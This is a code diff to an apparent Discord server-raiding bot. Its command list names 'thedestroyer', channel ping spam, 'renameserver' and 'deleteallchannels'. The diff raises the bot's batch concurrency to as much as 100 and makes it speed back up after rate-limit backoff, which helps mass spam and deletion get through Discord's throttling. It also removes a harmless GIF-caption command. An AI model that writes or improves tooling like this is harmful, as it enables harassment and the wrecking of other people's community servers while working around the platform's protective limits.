@@ -87,38 +87,57 @@ CACHE_DURATION = 60
 active_ping_tasks = {}
 active_doom_games = {}
 
+# ----- Ultra‑fast adaptive rate limiter -----
 class RateLimiter:
-    def __init__(self, initial_concurrency=10):
+    def __init__(self, initial_concurrency=25):
         self.concurrency = initial_concurrency
-        self.max_concurrency = 50
+        self.max_concurrency = 100
         self.min_concurrency = 1
+        self.rate_limit_count = 0          # per‑batch counter
+        self.hardcoded_mode = False
+        self.safe_concurrency = 5
         self.backoff_factor = 0.5
-        self.recovery_factor = 1.1
-        self.last_rate_limit = 0
-        self.cooldown = 5
+        self.speedup_factor = 1.2
 
     async def execute(self, tasks, task_func):
         if not tasks:
             return []
+        # Reset for this batch
+        self.rate_limit_count = 0
+        self.hardcoded_mode = False
+        concurrency = self.concurrency
         results = []
-        for i in range(0, len(tasks), self.concurrency):
-            batch = tasks[i:i+self.concurrency]
+
+        for i in range(0, len(tasks), concurrency):
+            batch = tasks[i:i+concurrency]
             try:
                 batch_results = await asyncio.gather(*[task_func(item) for item in batch], return_exceptions=True)
+                had_rate_limit = False
                 for res in batch_results:
                     if isinstance(res, Exception):
                         if isinstance(res, discord.HTTPException) and res.status == 429:
-                            self.concurrency = max(self.min_concurrency, int(self.concurrency * self.backoff_factor))
-                            self.last_rate_limit = time.time()
-                            await asyncio.sleep(5)
+                            self.rate_limit_count += 1
+                            had_rate_limit = True
+                            # Reduce concurrency
+                            concurrency = max(self.min_concurrency, int(concurrency * self.backoff_factor))
+                            if self.rate_limit_count >= 3:
+                                self.hardcoded_mode = True
+                                concurrency = self.safe_concurrency
+                                print(Fore.YELLOW + "[!] Rate limit threshold reached. Switching to hardcoded mode (safe concurrency)." + Style.RESET_ALL)
                         else:
                             pass
                     else:
                         results.append(res)
+                # If no rate limit in this batch and not in hardcoded mode, increase concurrency
+                if not had_rate_limit and not self.hardcoded_mode:
+                    concurrency = min(self.max_concurrency, int(concurrency * self.speedup_factor))
+                # Apply a small delay to let Discord breathe if we're near the limit
+                if len(batch) > concurrency * 0.8:
+                    await asyncio.sleep(0.1)
             except Exception as e:
                 print(Fore.RED + f"Batch error: {e}" + Style.RESET_ALL)
-            if time.time() - self.last_rate_limit > self.cooldown and self.concurrency < self.max_concurrency:
-                self.concurrency = min(self.max_concurrency, int(self.concurrency * self.recovery_factor))
+        # Update the main concurrency for future batches (but start fresh each command)
+        self.concurrency = concurrency
         return results
 
 rate_limiter = RateLimiter()
@@ -501,7 +520,6 @@ thedestroyer <channel> <message>
 ping <channel> <minutes>
 unping <channel>
 startdoom <channel>
-gifcaption <gif_url> <caption>  (in Discord)  or  gifcaption <channel> <gif_url> <caption>  (in CMD)
 listchannels
 renameserver <new_name>
 deleteallchannels
@@ -869,37 +887,6 @@ clear
             game.view = view
             active_doom_games[channel.id] = game
             print(Fore.YELLOW + f"[+] Doom game started in {channel.name}." + Style.RESET_ALL)
-        elif main == "gifcaption":
-            if not guild:
-                print(Fore.RED + "[-] No server selected/available!" + Style.RESET_ALL)
-                return
-            # Discord mode (ctx_author exists) -> channel from message
-            if ctx_author:
-                if len(parts) < 3:
-                    print(Fore.RED + "[-] Usage: gifcaption <gif_url> <caption>" + Style.RESET_ALL)
-                    return
-                gif_url = parts[1]
-                caption = " ".join(parts[2:])
-                channel = message_obj.channel
-            else:
-                # CMD mode: channel name must be first argument
-                if len(parts) < 4:
-                    print(Fore.RED + "[-] In CMD mode, usage: gifcaption <channel> <gif_url> <caption>" + Style.RESET_ALL)
-                    return
-                channel_name = parts[1]
-                gif_url = parts[2]
-                caption = " ".join(parts[3:])
-                channel = discord.utils.get(guild.text_channels, name=channel_name)
-                if not channel:
-                    print(Fore.RED + f"[-] Channel not found: {channel_name}" + Style.RESET_ALL)
-                    return
-            if not (gif_url.startswith("http://") or gif_url.startswith("https://")):
-                print(Fore.RED + "[-] Invalid URL. Must start with http:// or https://" + Style.RESET_ALL)
-                return
-            embed = discord.Embed(description=caption, color=discord.Color.blue())
-            embed.set_image(url=gif_url)
-            await channel.send(embed=embed)
-            print(Fore.YELLOW + f"[+] GIF with caption sent in {channel.name}" + Style.RESET_ALL)
         elif main == "deleteallchannels":
             if not guild:
                 print(Fore.RED + "[-] No server selected/available!" + Style.RESET_ALL)
